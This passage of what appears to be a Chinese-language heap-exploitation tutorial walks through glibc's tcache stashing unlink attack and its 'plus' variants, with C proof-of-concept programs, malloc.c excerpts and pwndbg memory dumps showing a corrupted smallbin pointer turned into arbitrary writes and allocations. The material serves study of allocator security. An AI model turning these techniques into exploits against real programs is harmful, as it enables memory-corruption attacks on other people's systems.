+(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>
+                  top: <span class="hljs-number">0x55555555a030</span> (size : <span class="hljs-number">0x1ffd0</span>) 
+       last_remainder: <span class="hljs-number">0x555555559e30</span> (size : <span class="hljs-number">0x60</span>) 
+            unsortbin: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x060</span>)  smallbin[ <span class="hljs-number">4</span>]: <span class="hljs-number">0x555555559e30</span>  &lt;--&gt; <span class="hljs-number">0x5555555598c0</span>
+(<span class="hljs-number">0x60</span>)   tcache_entry[<span class="hljs-number">4</span>](<span class="hljs-number">6</span>): <span class="hljs-number">0x5555555594a0</span> --&gt; <span class="hljs-number">0x555555559440</span> --&gt; <span class="hljs-number">0x5555555593e0</span> --&gt; <span class="hljs-number">0x555555559380</span> --&gt; <span class="hljs-number">0x555555559320</span> --&gt; <span class="hljs-number">0x5555555592c0</span></code></pre></div>
+
+<p>可以看到已经完成构造了。接着进行change 0x555555559e30 的bk为目标地址-0x10。</p>
+<div class="hljs"><pre><code class="hljs c">*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;</code></pre></div>
+
+<p>原始：</p>
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559e30</span>
+<span class="hljs-number">0x555555559e30</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span>
+<span class="hljs-number">0x555555559e40</span>: <span class="hljs-number">0x00005555555598c0</span>      <span class="hljs-number">0x00007ffff7fb9c30</span></code></pre></div>
+
+<p>change 后：</p>
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559e30</span>
+<span class="hljs-number">0x555555559e30</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span>
+<span class="hljs-number">0x555555559e40</span>: <span class="hljs-number">0x00005555555598c0</span>      <span class="hljs-number">0x0000555555558040</span>
+<span class="hljs-number">0x555555559e50</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div>
+
+<p>再看下即将被calloc申请到的smallbin：</p>
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x5555555598c0</span>
+<span class="hljs-number">0x5555555598c0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span>
+<span class="hljs-number">0x5555555598d0</span>: <span class="hljs-number">0x00007ffff7fb9c30</span>      <span class="hljs-number">0x0000555555559e30</span></code></pre></div>
+
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);</code></pre></div>
+
+<p>其先会进行一个解链：</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))
+   &#123;
+     idx = smallbin_index (nb);
+     bin = bin_at (av, idx);
+
+     <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)
+       &#123;
+         bck = victim-&gt;bk; <span class="hljs-comment">//1</span>
+     <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="hljs-comment">//2 明显是可以通过其双向链表的检查，会被正常的解链</span>
+       malloc_printerr (<span class="hljs-string">"malloc(): smallbin double linked list corrupted"</span>);
+         set_inuse_bit_at_offset (victim, nb);
+         bin-&gt;bk = bck;
+         bck-&gt;fd = bin;
+
+         <span class="hljs-keyword">if</span> (av != &amp;main_arena)
+       set_non_main_arena (victim);
+         check_malloced_chunk (av, victim, nb);</code></pre></div>
+
+<p>接着会进行stash：</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span>
+      <span class="hljs-comment">/* While we're here, if we see other chunks of the same size,
+         stash them in the tcache.  */</span>
+      <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);
+      <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
+        &#123;
+          mchunkptr tc_victim;
+
+          <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>
+          <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
+             &amp;&amp; (tc_victim = last (bin)) != bin)
+        &#123;
+          <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)
+            &#123;
+              bck = tc_victim-&gt;bk;
+              set_inuse_bit_at_offset (tc_victim, nb);
+              <span class="hljs-keyword">if</span> (av != &amp;main_arena)
+            set_non_main_arena (tc_victim);
+              bin-&gt;bk = bck;
+              bck-&gt;fd = bin;
+
+              tcache_put (tc_victim, tc_idx);
+                &#125;
+        &#125;</code></pre></div>
+
+<p>可以看到这一块，并没有进行双向链表的检查。其中<code>bck-&gt;fd = bin;</code>这个也就是对于 (&amp;tag - 0x10) + 0x10 = bin。也就是将目标地址上的值赋为 bin，这样就实现了等价于 unsortedbin Attack 的操作。</p>
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0000555555558050</span>
+<span class="hljs-number">0x555555558050</span> &lt;victim&gt;:        <span class="hljs-number">0x00007ffff7fb9c30</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div>
+
+<p>可以看到攻击已经成功。</p>
+<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x60</span>)   tcache_entry[4](7): 0x555555559e40 --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5555555594a0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559440</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5555555593e0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559380</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559320</span> --&gt;</span> <span class="hljs-number">0</span>x5555555592c0</code></pre></div>
+
+<p>且已经满chain，结束了stash的过程。</p>
+<p>需要注意的是，刚才描述的放入过程是一个循环，我们将伪造的bck看成一个堆块，其bk很可能是一个非法的地址，这样就导致循环到下一个堆块时unlink执行到<code>bck-&gt;fd = bin;</code>访问非法内存造成程序crash。所以开始，选择释放6个对应size的chunk到tcache bin，只为tcache留一个空间，这样循环一次就会跳出，不会有后续问题。</p>
+<h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><ul>
+<li>先放入 2 个 Chunk 到 smallbins，6 个 Chunk 到对应的 tcache；</li>
+<li>然后在不破坏 fd 的情况下,将后放入 smallbins 的 chunk 的 bk 设置为目标地址减 0x10。</li>
+<li>这样再用calloc向 smallbins 申请对应大小的 Chunk 时，先放入 smallbins 的 Chunk 被分配给用户，然后触发 stash 机制。<code>bck = tc_victim-&gt;bk;</code>此时的 bck 就是目标地址减 0x10，之后<code>bck-&gt;fd = bin;</code> 也就是将目标地址上的值赋为 bin，写上了<code>main_arena</code>的地址，这样就实现了等价于 unsortedbin attack 的操作；</li>
+<li>之后再调用 <code>tcache_put</code> 把后放入 smallbins 的 Chunk 取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 Chunk，在这次之后达到了阈值，所以也就退出了 stash 循环，整个流程就会正常结束。</li>
+</ul>
+<h3 id="tcache-stashing-unlink-plus"><a href="#tcache-stashing-unlink-plus" class="headerlink" title="tcache_stashing_unlink plus"></a><code>tcache_stashing_unlink plus</code></h3><h4 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span>
+<span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;
+	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);
+	setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);
+
+	<span class="hljs-keyword">char</span> *t1;
+	<span class="hljs-keyword">char</span> *s1, *s2, *pad;
+	<span class="hljs-keyword">char</span> *tmp;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"You can use this technique to get a tcache chunk to arbitrary address\n"</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n1. need to know heap address and the victim address that you need to attack\n"</span>);
+
+	tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, 
+		&amp;victim, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"heap address: %p\n"</span>, tmp<span class="hljs-number">-0x260</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n2. change victim's data, make victim[1] = &amp;victim, or other address to writable address\n"</span>);
+	<span class="hljs-comment">//只要是一个可以写的指针地址即可，不一定是&amp;victim</span>
+	victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, 
+		victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);
+
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n3. choose a stable size and free five identical size chunks to tcache_entry list\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Here, I choose the size 0x60\n"</span>);
+	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;
+		t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);
+		<span class="hljs-built_in">free</span>(t1);
+	&#125;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, 
+		t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n"</span>);
+
+	s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);
+	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);
+	<span class="hljs-built_in">free</span>(s1);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s1+<span class="hljs-number">0x3c0</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);
+	s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);
+	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);
+	<span class="hljs-built_in">free</span>(s2);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s2+<span class="hljs-number">0x3c0</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"smallbin[4] list is %p &lt;--&gt; %p\n"</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n"</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);
+	*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n"</span>);
+
+	<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, 
+		&amp;victim, s2+<span class="hljs-number">0x3d0</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Apply to tcache_entry[4], you can get a pointer to victim address\n"</span>);
+	
+	<span class="hljs-keyword">uint64_t</span> *r = (<span class="hljs-keyword">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);
+	r[<span class="hljs-number">0</span>] = <span class="hljs-number">0xaa</span>;
+	r[<span class="hljs-number">1</span>] = <span class="hljs-number">0xbb</span>;
+	r[<span class="hljs-number">2</span>] = <span class="hljs-number">0xcc</span>;
+	r[<span class="hljs-number">3</span>] = <span class="hljs-number">0xdd</span>;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, 
+		victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);
+	
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;</code></pre></div>
+
+<p>由于大多地方调试信息都相似，只分析一下重点处的相关信息：</p>
+<h4 id="重点调试过程"><a href="#重点调试过程" class="headerlink" title="重点调试过程"></a>重点调试过程</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-selector-tag">b</span> <span class="hljs-number">70</span></code></pre></div>
+
+<p>先断在源程序代码的第70行，下面紧跟着的是calloc.<br>看下内存信息：<br>被恶意chage的smallbin chunk：</p>
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559dd0</span>
+<span class="hljs-number">0x555555559dd0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span>
+<span class="hljs-number">0x555555559de0</span>: <span class="hljs-number">0x0000555555559860</span>      <span class="hljs-number">0x0000555555558050</span>(tag<span class="hljs-number">-0x10</span>)</code></pre></div>
+
+<p>即将被取走的smallbin chunk：</p>
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0000555555559860</span>
+<span class="hljs-number">0x555555559860</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span>
+<span class="hljs-number">0x555555559870</span>: <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555559dd0</span></code></pre></div>
+
+<p>接着si进入calloc内部,进入malloc.c：</p>
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; b <span class="hljs-number">3654</span>
+Breakpoint <span class="hljs-number">3</span> at <span class="hljs-number">0x7ffff7e69c87</span>: file malloc.c, line <span class="hljs-number">3655.</span></code></pre></div>
+
+<p>直接断在stash区进行分析:</p>
+<h5 id="第一轮的stash："><a href="#第一轮的stash：" class="headerlink" title="第一轮的stash："></a>第一轮的stash：</h5><div class="hljs"><pre><code class="hljs c">
+ <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
+&#123;
+  mchunkptr tc_victim;
+
+  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>
+  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
+	 &amp;&amp; (tc_victim = last (bin)) != bin)   <span class="hljs-comment">//#define last(b)      ((b)-&gt;bk)  也就是 tc_victim = bin-&gt;bk</span></code></pre></div>
+
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p tc_victim
+$<span class="hljs-number">19</span> = (mchunkptr) <span class="hljs-number">0x555555559dd0</span></code></pre></div>
+
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559dd0</span>
+<span class="hljs-number">0x555555559dd0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span>
+<span class="hljs-number">0x555555559de0</span>: <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555558050</span></code></pre></div>
+
+<div class="hljs"><pre><code class="hljs c">&#123;
+		  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)
+			&#123;
+			  bck = tc_victim-&gt;bk; <span class="hljs-comment">//bck = tag-0x10</span>
+			  set_inuse_bit_at_offset (tc_victim, nb);
+			  <span class="hljs-keyword">if</span> (av != &amp;main_arena)
+			set_non_main_arena (tc_victim);
+			  bin-&gt;bk = bck; <span class="hljs-comment">//tag - 0x10 被写在bin-&gt;bk处</span>
+			  bck-&gt;fd = bin; <span class="hljs-comment">//bin 被写在tag处</span>
+		  <span class="hljs-comment">//将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出</span>
+			  tcache_put (tc_victim, tc_idx);
+				&#125;
+		&#125;</code></pre></div>
+
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0000555555558050</span>
+<span class="hljs-number">0x555555558050</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span>
+<span class="hljs-number">0x555555558060</span> &lt;victim&gt;:        <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555558060</span>
+<span class="hljs-number">0x555555558070</span> &lt;victim+<span class="hljs-number">16</span>&gt;:     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div>
+
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x00007ffff7fbac30</span>
+<span class="hljs-number">0x7ffff7fbac30</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:        <span class="hljs-number">0x00007ffff7fbac20</span>      <span class="hljs-number">0x00007ffff7fbac20</span>
+<span class="hljs-number">0x7ffff7fbac40</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:        <span class="hljs-number">0x0000555555559dd0</span>      <span class="hljs-number">0x0000555555558050</span>（tag - <span class="hljs-number">0x10</span>）</code></pre></div>
+
+<p>tcache 放入了 <code>tc_victim = 0x555555559de0</code></p>
+<div class="hljs"><pre><code class="hljs undefined">(0x60)   tcache_entry[<span class="hljs-string">4</span>](<span class="hljs-link">6</span>): 0x555555559de0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0</code></pre></div>
+
+<h5 id="第二轮的stash："><a href="#第二轮的stash：" class="headerlink" title="第二轮的stash："></a>第二轮的stash：</h5><p>重点攻击的是<code>tc_victim</code> 也就是目标地址。</p>
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p tc_victim
+$<span class="hljs-number">21</span> = (mchunkptr) <span class="hljs-number">0x555555558050</span></code></pre></div>
+
+<p>很明显最终目标也就是保证让<code>tc_victim</code>放入tcache即可。观察代码，可以发现仅需要保证的也就是不要让程序crush。</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)
+			&#123;
+			<span class="hljs-comment">//得保证目标地址chunk的bk为可写的指针</span>
+			  bck = tc_victim-&gt;bk; <span class="hljs-comment">//tag-0x10-&gt;bk=bck =tag+8 </span>
+			  set_inuse_bit_at_offset (tc_victim, nb);
+			  <span class="hljs-keyword">if</span> (av != &amp;main_arena)
+			set_non_main_arena (tc_victim);
+			  bin-&gt;bk = bck;
+			  bck-&gt;fd = bin; <span class="hljs-comment">//保证一个可写的bck，程序即可正常的执行</span>
+
+		  <span class="hljs-comment">//将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出</span>
+			  tcache_put (tc_victim, tc_idx);</code></pre></div>
+
+<p>其得保证<code>tc_victim-&gt;bk</code>是一个可写指针，此示例程序是<code>&amp;victim</code>，是其他的也是可以的。</p>
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555558050</span>
+<span class="hljs-number">0x555555558050</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span>
+<span class="hljs-number">0x555555558060</span> &lt;victim&gt;:        <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555558060</span>
+<span class="hljs-number">0x555555558070</span> &lt;victim+<span class="hljs-number">16</span>&gt;:     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div>
+
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p bck
+$<span class="hljs-number">22</span> = (mchunkptr) <span class="hljs-number">0x555555558060</span> &lt;victim&gt;</code></pre></div>
+
+<p>执行完毕后，获得一个目标地址的chunk进入了tcache，也达到了阈值，也就退出了 stash 循环。<br>并且再次申请一下就得到一个目标地址的chunk。</p>
+<div class="hljs"><pre><code class="hljs undefined">(<span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x60</span>)   tcache_entry[4](7): 0x555555558060 --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559de0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559440</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5555555593e0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559380</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559320</span> --&gt;</span> <span class="hljs-number">0</span>x5555555592c0</code></pre></div>
+
+<h4 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h4><ul>
+<li>先放入 2 个 Chunk 到 Smallbins，5 个 Chunk 到对应的 tcache</li>
+<li>在不破坏 fd 的情况下，<strong>将后放入 Smallbins 的 Chunk 的 bk 设置为目标地址减 0x10，同时要将目标地址加 0x8 处的值设置为一个指向一处可写内存的指针；</strong></li>
+<li>接着用calloc触发stash 机制，会将后放入 Smallbins 的 Chunk 被放入 tcache，此时的 bin-&gt;bk 就是目标地址减 0x10，相当于把目标地址减 0x10 的指针链接进了 smallbins 中。</li>
+<li>之后不满足终止条件，会进行下一次的 stash，这时的 <code>tc_victim</code> 就是目标地址。接下来由于原来的设置，目标地址加 0x8 处的指针是一个可写指针，保证stash流程正常走完。</li>
+<li>最后目标地址就会被放入 <code>tcache_entry</code>的头部，stash 满足终止条件而终止。</li>
+</ul>
+<p>重点在攻击最后一个进入smallbin的bk指针，让其指向目标地址-0x10的地方，并且<strong>保证目标地址+8的位置为一个可写的指针。</strong></p>
+<h3 id="tcache-stashing-unlink-plus-plus"><a href="#tcache-stashing-unlink-plus-plus" class="headerlink" title="tcache_stashing_unlink plus plus"></a><code>tcache_stashing_unlink plus plus</code></h3><p>也就是可以同时实现上面的2个功能。</p>
+<ul>
+<li>任意地址分配一个chunk</li>
+<li>任意地址写入一个<code>main_arena</code>附近的值</li>
+</ul>
+<h4 id="示例代码-2"><a href="#示例代码-2" class="headerlink" title="示例代码"></a>示例代码</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span>
+
+<span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;
+<span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim2 = <span class="hljs-number">0</span>;
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;
+	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);
+	setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);
+
+	<span class="hljs-keyword">char</span> *t1;
+	<span class="hljs-keyword">char</span> *s1, *s2, *pad;
+	<span class="hljs-keyword">char</span> *tmp;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n"</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n"</span>);
+
+	tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, 
+		&amp;victim, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim2's address: %p, victim2's value: 0x%lx\n"</span>,
+		&amp;victim2, victim2);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"heap address: %p\n"</span>, tmp<span class="hljs-number">-0x260</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n2. change victim's data, make victim[1] = &amp;victim2-0x10\n"</span>);
